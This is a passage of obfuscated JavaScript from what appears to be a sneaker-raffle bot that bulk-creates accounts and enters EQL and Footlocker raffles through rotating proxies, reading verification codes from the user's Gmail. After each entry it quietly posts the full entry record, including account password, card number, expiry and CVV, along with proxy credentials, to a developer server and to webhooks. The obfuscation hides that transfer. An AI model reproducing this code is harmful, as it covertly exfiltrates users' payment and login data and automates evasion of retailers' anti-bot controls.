                                _0x4b93fc[_0x53b851]['Url']['includes']('en-GB') ? await _0x4cb23b['click']('li[data-value=\x22UK\x20' + _0x4b93fc[_0x53b851]['Size'] + '\x20/\x20US\x20' + (Number(_0x4b93fc[_0x53b851]['Size']) + 0x1) + '\x22]') : await _0x4cb23b['click']('li[data-value=\x22EU\x20' + _0x4b93fc[_0x53b851]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x4b93fc[_0x53b851]['Size']);
                            }
                            await _0x2be9fc(0x6a4), await _0x4cb23b['type']('#email', '' + _0x4b93fc[_0x53b851]['Email']), await _0x2be9fc(0x352), await _0x4cb23b['waitForSelector']('#password'), await _0x4cb23b['type']('#password', '' + _0x4b93fc[_0x53b851]['Password']), await _0x2be9fc(0x352), await _0x4cb23b['type']('#phone', '' + _0x4b93fc[_0x53b851]['Phone']), await _0x2be9fc(0x352);
                            const _0x356a4c = await _0x4cb23b['$']('#title\x20>\x20label');
                            await _0x2be9fc(0x12c);
                            _0x356a4c && await _0x356a4c['click']();
                            await _0x4cb23b['type']('#firstName', '' + _0x4b93fc[_0x53b851]['FirstName']), await _0x2be9fc(0x352), await _0x4cb23b['type']('#lastName', '' + _0x4b93fc[_0x53b851]['LastName']), await _0x2be9fc(0x352);
                            _0x4b93fc[_0x53b851]['Url']['includes']('footlocker.de') ? await _0x4cb23b['type']('#birthdate', _0xb2bcf5(0xa, 0x1c) + '.' + _0xb2bcf5(0xa, 0xc) + '.' + _0xb2bcf5(0x7c6, 0x7d3)) : await _0x4cb23b['type']('#birthdate', _0xb2bcf5(0xa, 0x1c) + '-' + _0xb2bcf5(0xa, 0xc) + '-' + _0xb2bcf5(0x7c6, 0x7d3));
                            await _0x2be9fc(0x352), await _0x4cb23b['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x4b93fc[_0x53b851]['Url']['includes']('en-GB') && await _0x4cb23b['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x2be9fc(0x1f4), await _0x2be9fc(0x5dc);
                            if (!_0x436ce9['includes']('footlocker'))
                                try {
                                    await _0x4cb23b['click']('#country');
                                    const _0x2388d5 = await _0x4cb23b['$']('li[data-value=\x22' + _0x4b93fc[_0x53b851]['Country'] + '\x22]');
                                    await _0x2388d5['click'](), await _0x2388d5['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x2be9fc(0x3e8);
                            if (!_0x4b93fc[_0x53b851]['Url']['includes']('en-GB')) {
                                await _0x4cb23b['click']('#stateAutocomplete'), await _0x2be9fc(0x1f4);
                                try {
                                    const _0x563304 = await _0x4cb23b['$x']('//li[text()=\x22' + _0x4b93fc[_0x53b851]['State'] + '\x22]');
                                    await _0x563304[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x2be9fc(0x3e8), await _0x2be9fc(0x1f4), await _0x4cb23b['type']('#address1', _0x4b93fc[_0x53b851]['Address1'] + '\x20' + _0x4b93fc[_0x53b851]['HouseNumber']), await _0x2be9fc(0x1f4), await _0x4cb23b['type']('#address2', '' + _0x4b93fc[_0x53b851]['Address2']), await _0x2be9fc(0x1f4), await _0x4cb23b['type']('#city', '' + _0x4b93fc[_0x53b851]['City']), await _0x2be9fc(0x1f4), await _0x4cb23b['type']('#postcode', '' + _0x4b93fc[_0x53b851]['Zip']), await _0x2be9fc(0x3e8), await _0x4cb23b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2be9fc(0x3e8), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x2cef7f = await _0x4cb23b['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x2cef7f && (await _0x4cb23b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4cb23b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4cb23b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2be9fc(0x4b0), await _0x4cb23b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2be9fc(0x1f4), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CardNumber']), await _0x2be9fc(0x320), await _0x4cb23b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4cb23b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['ExpiryDate']), await _0x2be9fc(0x4b0), await _0x4cb23b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4cb23b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CVV']), await _0x2be9fc(0x226), await _0x4cb23b['type']('input[name=\x22postalCode\x22]', '' + _0x4b93fc[_0x53b851]['Zip']), await _0x2be9fc(0x226));
                            const _0x3e420f = await _0x4cb23b['$']('.__PrivateStripeElement');
                            _0x3e420f && (await _0x2be9fc(0x1f4), await _0x4cb23b['click']('.__PrivateStripeElement'), await _0x4cb23b['click']('.__PrivateStripeElement'), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CardNumber']), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['ExpiryDate']), await _0x4cb23b['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CVV']));
                            await _0x2be9fc(0x226), await _0x4cb23b['click']('#paymentConsent'), await _0x2be9fc(0x226), await _0x4cb23b['click']('#termsConsent'), await _0x2be9fc(0x2bc), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4cb23b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2be9fc(0x2710);
                            try {
                                await _0x4cb23b['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x2be9fc(0xbb8), await _0x4cb23b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5a93c8 => _0x5a93c8['click']()), await _0x4cb23b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x12627b => _0x12627b['click']());
                            } catch {
                            }
                            try {
                                await _0x4cb23b['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x130664 = await _0x4cb23b['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x130664) {
                                    _0xa4bb3a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4b93fc[_0x53b851]['Email'] + ',' + _0x4b93fc[_0x53b851]['Password'] + ',' + _0x4b93fc[_0x53b851]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x5aa657() {
                                var _0x1594b5, _0x3fb0dc = ![];
                                for (var _0x320178 = 0x0; _0x320178 < 0x18; _0x320178++) {
                                    async function _0x445739() {
                                        var _0x51e55a = new _0x2e8fd8({
                                            'user': _0x30cea3['masterMail'],
                                            'password': _0x30cea3['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x56d17e(_0x6e8c5b) {
                                            _0x51e55a['openBox']('INBOX', ![], _0x6e8c5b);
                                        }
                                        _0x51e55a['once']('ready', function () {
                                            console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x56d17e(function (_0xd7ba71, _0xdf4a10) {
                                                console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xd7ba71)
                                                    throw _0xd7ba71;
                                                _0x51e55a['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x474f21, _0x9ec66d) {
                                                    if (!_0x9ec66d || !_0x9ec66d['length'])
                                                        console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x51e55a['end']();
                                                    else {
                                                        var _0x36b0f9 = _0x51e55a['seq']['fetch'](_0x9ec66d, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x36b0f9['on']('message', function (_0x6326ef, _0x452e98) {
                                                            var _0x44e903 = '(#' + _0x452e98 + ')\x20';
                                                            _0x6326ef['on']('body', function (_0x5286ac, _0x5e8f45) {
                                                                _0x2f2a1d(_0x5286ac, (_0x2f972f, _0x3e86e2) => {
                                                                    if (_0x3e86e2['subject']['includes']('code')) {
                                                                        const _0x5116c6 = _0x3e86e2['text']['split']('\x0a\x0a')[0x3], _0x162e80 = _0x5116c6['split']('\x0a')[0x1];
                                                                        _0x1594b5 = _0x162e80;
                                                                    }
                                                                });
                                                            }), _0x6326ef['once']('end', function () {
                                                            });
                                                        }), _0x36b0f9['once']('error', function (_0x1542d0) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x36b0f9['once']('end', function () {
                                                            _0x51e55a['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x51e55a['once']('error', function (_0x16d749) {
                                            console['log'](_0x10a2e3['red'](_0x16d749['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3fb0dc = !![];
                                        }), _0x51e55a['once']('end', async function () {
                                        }), _0x51e55a['connect']();
                                    }
                                    _0x445739(), await _0x2be9fc(0x1388);
                                    if (_0x1594b5)
                                        return _0x1594b5;
                                    if (_0x3fb0dc)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x320178 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x5aa657(), await _0x2be9fc(0x1f4), await _0x4cb23b['type']('#code', '' + code), await _0x2be9fc(0x3e8), await _0x4cb23b['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x43e5d6 => _0x43e5d6['click']()), await _0x4cb23b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x4cb23b['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x4b93fc[_0x53b851]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0xa4bb3a['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4b93fc[_0x53b851]['Email'] + ',' + _0x4b93fc[_0x53b851]['Password'] + ',' + _0x4b93fc[_0x53b851]['Phone']), _0x5e7923 = 'no', _0x34c52d(_0x4b93fc[_0x53b851], _0x199478);
                            var _0x4e9988 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', ![]), _0x26edd2 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'pub', ![]);
                            let _0x339fa8 = _0x4b93fc[_0x53b851];
                            try {
                                prxdata = {
                                    'username': _0x3373db['replace']('#', ''),
                                    'module': _0x199478['name'],
                                    'entrydata': JSON['stringify'](_0x339fa8),
                                    'proxy': '' + _0x2c4e3e[_0x53b851]
                                };
                                var _0x1d5a8c = JSON['stringify'](prxdata);
                                let _0x292f9a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x1d5a8c, _0x292f9a);
                            } catch (_0x4d1dde) {
                            }
                            const _0x2a4422 = {
                                'succesDEVMSG': { 'embeds': [_0x4e9988] },
                                'succesPUBMSG': { 'embeds': [_0x26edd2] }
                            };
                            try {
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x2a4422['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x2a4422['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x2a4422['succesPUBMSG']);
                            } catch (_0x560003) {
                                console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x560003));
                            }
                        } catch (_0x2e5ece) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20' + _0x2e5ece)), _0x5ed54b = '' + _0x2e5ece;
                            var _0x423c96 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', !![], _0x5ed54b), _0x4e9988 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', ![]), _0x26edd2 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'pub', ![]);
                            const _0x117476 = {
                                'succesDEVMSG': { 'embeds': [_0x4e9988] },
                                'succesPUBMSG': { 'embeds': [_0x26edd2] }
                            };
                            _0x117476['errorDEV'] = { 'embeds': [_0x423c96] };
                            _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x117476['errorDEV']);
                            await _0x1bfffd(_0x31e47f, _0x117476['errorDEV']);
                            if (!_0x5e7923 == 'no')
                                _0x5e7923 = 'yes';
                        } finally {
                            _0x206a19 && _0x206a19['close']();
                            if (_0x5e7923 == 'yes' && _0x21361c != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21361c + '\x20/\x205)')), _0x53b851 = _0x53b851 - 0x1, _0x21361c = _0x21361c + 0x1;
                                continue;
                            }
                            _0x5e7923 == 'yes' && _0x21361c >= 0x5 && (_0x48f0c7(_0x4b93fc[_0x53b851], _0x199478), _0x5e7923 = 'no', _0x21361c = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    } else {
                        const _0x336466 = '' + _0x4b93fc[_0x53b851]['Url'];
                        if (_0x5e7923 != 'yes')
                            var _0x5e7923 = '', _0x21361c = 0x0;
                        if (_0x4b93fc[_0x53b851]['Email'] == '' || _0x4b93fc[_0x53b851]['FirstName'] == '' || _0x4b93fc[_0x53b851]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4b93fc[_0x53b851]['Password'] == '' && (_0x4b93fc[_0x53b851]['Password'] = 'JRaffles23!');
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x317458 = _0x2c4e3e[_0x53b851]['split'](':');
                        else
                            var _0x5024ac = Math['round'](Math['random']() * (_0x2c4e3e['length'] - 0x1)), _0x317458 = _0x2c4e3e[_0x5024ac]['split'](':');
                        var _0x206a19;
                        try {
                            _0x206a19 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x317458[0x0] + ':' + _0x317458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x206a19 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x317458[0x0] + ':' + _0x317458[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5c0192 = await _0x206a19['newPage']();
                            await _0x5c0192['authenticate']({
                                'username': '' + _0x317458[0x2],
                                'password': '' + _0x317458[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5c0192['setRequestInterception'](!![]), _0x5c0192['on']('request', _0x5d9685 => {
                                _0x5d9685['resourceType']() === 'image' || _0x5d9685['resourceType']() === 'font' || _0x5d9685['resourceType']() === 'media' ? _0x5d9685['abort']() : _0x5d9685['continue']();
                            }), await _0x5c0192['goto'](_0x336466), await _0x5c0192['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x5c0192['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2be9fc(0x7d0), await _0x5c0192['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x5c0192['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2be9fc(0x3e8), await _0x5c0192['waitForSelector']('#email'), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x5c0192['type']('#email', '' + _0x4b93fc[_0x53b851]['Email']), await _0x2be9fc(0x352), await _0x5c0192['waitForSelector']('#password'), await _0x5c0192['type']('#password', '' + _0x4b93fc[_0x53b851]['Password']), await _0x2be9fc(0x352), await _0x5c0192['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2be9fc(0x1388);
                            if (!_0x4b93fc[_0x53b851]['Url']['includes']('footlocker'))
                                await _0x5c0192['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x5c0192['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x34c52d(_0x4b93fc[_0x53b851], _0x199478), _0x5e7923 = 'no';
                                continue;
                            }
                            await _0x5c0192['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x2be9fc(0x3e8);
                            try {
                                _0x4b93fc[_0x53b851]['Url']['includes']('en-GB') ? await _0x5c0192['click']('li[data-value=\x22UK\x20' + _0x4b93fc[_0x53b851]['Size'] + '\x20/\x20US\x20' + (Number(_0x4b93fc[_0x53b851]['Size']) + 0x1) + '\x22]') : await _0x5c0192['click']('li[data-value=\x22EU\x20' + _0x4b93fc[_0x53b851]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x4b93fc[_0x53b851]['Size']);
                            }
                            await _0x2be9fc(0x1f4);
                            const _0x31c637 = await _0x5c0192['$']('#title\x20>\x20label');
                            await _0x2be9fc(0x12c);
                            _0x31c637 && await _0x31c637['click']();
                            await _0x5c0192['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x5c0192['focus']('#postcode'), await _0x5c0192['keyboard']['down']('Control'), await _0x5c0192['keyboard']['press']('A'), await _0x5c0192['keyboard']['up']('Control'), await _0x5c0192['keyboard']['press']('Backspace'), await _0x5c0192['keyboard']['type'](_0x4b93fc[_0x53b851]['Zip']), await _0x2be9fc(0x60e), await _0x5c0192['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2be9fc(0x3e8), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x2be9fc(0x1f4);
                            const _0x48e987 = await _0x5c0192['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x48e987 && (await _0x5c0192['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c0192['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5c0192['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2be9fc(0x4b0), await _0x5c0192['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2be9fc(0x1f4), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CardNumber']), await _0x2be9fc(0x320), await _0x5c0192['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['ExpiryDate']), await _0x2be9fc(0x4b0), await _0x5c0192['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CVV']), await _0x2be9fc(0x226), await _0x5c0192['type']('input[name=\x22postalCode\x22]', '' + _0x4b93fc[_0x53b851]['Zip']), await _0x2be9fc(0x226));
                            const _0x3541eb = await _0x5c0192['$']('.__PrivateStripeElement');
                            _0x3541eb && (await _0x5c0192['click']('#billingName'), await _0x5c0192['click']('#billingName'), await _0x5c0192['type']('#billingName', '' + _0x4b93fc[_0x53b851]['NameOnCard']), await _0x2be9fc(0x1f4), await _0x5c0192['click']('.__PrivateStripeElement'), await _0x5c0192['click']('.__PrivateStripeElement'), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CardNumber']), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['ExpiryDate']), await _0x5c0192['keyboard']['type']('' + _0x4b93fc[_0x53b851]['CVV']));
                            await _0x2be9fc(0x226), await _0x5c0192['click']('#paymentConsent'), await _0x2be9fc(0x226), await _0x5c0192['click']('#termsConsent'), await _0x2be9fc(0x2bc), console['log'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5c0192['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2be9fc(0x2710);
                            try {
                                await _0x5c0192['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x2be9fc(0xbb8), await _0x5c0192['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2ac736 => _0x2ac736['click']()), await _0x5c0192['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x20f8cb => _0x20f8cb['click']());
                            } catch {
                            }
                            try {
                                await _0x5c0192['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x34c52d(_0x4b93fc[_0x53b851], _0x199478);
                            var _0x4e9988 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', ![]), _0x26edd2 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'pub', ![]);
                            let _0x55c0dc = _0x4b93fc[_0x53b851];
                            try {
                                prxdata = {
                                    'username': _0x3373db['replace']('#', ''),
                                    'module': _0x199478['name'],
                                    'entrydata': JSON['stringify'](_0x55c0dc),
                                    'proxy': '' + _0x2c4e3e[_0x53b851]
                                };
                                var _0x1d5a8c = JSON['stringify'](prxdata);
                                let _0x2cb193 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x1d5a8c, _0x2cb193);
                            } catch (_0x4d340a) {
                            }
                            const _0xe36d56 = {
                                'succesDEVMSG': { 'embeds': [_0x4e9988] },
                                'succesPUBMSG': { 'embeds': [_0x26edd2] }
                            };
                            try {
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0xe36d56['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0xe36d56['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0xe36d56['succesPUBMSG']);
                            } catch (_0x5be633) {
                                console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5be633));
                            }
                            _0x5e7923 = 'no';
                        } catch (_0x9dd67) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20' + _0x9dd67)), _0x5ed54b = '' + _0x9dd67;
                            var _0x423c96 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', !![], _0x5ed54b), _0x4e9988 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'dev', ![]), _0x26edd2 = await _0x14203e(_0x4b93fc[_0x53b851], _0x199478, 'pub', ![]);
                            const _0x4ec40d = {
                                'succesDEVMSG': { 'embeds': [_0x4e9988] },
                                'succesPUBMSG': { 'embeds': [_0x26edd2] }
                            };
                            _0x4ec40d['errorDEV'] = { 'embeds': [_0x423c96] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x4ec40d['errorDEV']), await _0x1bfffd(_0x31e47f, _0x4ec40d['errorDEV']), _0x5e7923 = 'yes';
                        } finally {
                            _0x206a19 && _0x206a19['close']();
                            if (_0x5e7923 == 'yes' && _0x21361c != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x199478['name'] + ']\x20Task\x20' + (_0x53b851 + 0x1) + '\x20:\x20Retrying\x20(' + _0x21361c + '\x20/\x205)')), _0x53b851 = _0x53b851 - 0x1, _0x21361c = _0x21361c + 0x1;
                                continue;
                            }
                            _0x5e7923 == 'yes' && _0x21361c >= 0x5 && (_0x48f0c7(_0x4b93fc[_0x53b851], _0x199478), _0x5e7923 = 'no', _0x21361c = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x3b9da6, _0xf03526, _0x2e3ca9) {
                    var _0x318d81 = _0xf03526, _0xbd4248 = 0x0;
                    for (var _0x19f4d4 = 0x0; _0x19f4d4 < _0xf03526['length']; _0x19f4d4++) {
                        maxTasks = Number(_0x30cea3['threads']);
                        while (_0xbd4248 >= maxTasks) {
                            await _0x2be9fc(_0x30cea3['delay']);
                        }
                        let _0xe20746 = ![];
                        async function _0x1967a9(_0x3936df, _0x2232be, _0x3627c9, _0x53c39c, _0xbaf8) {
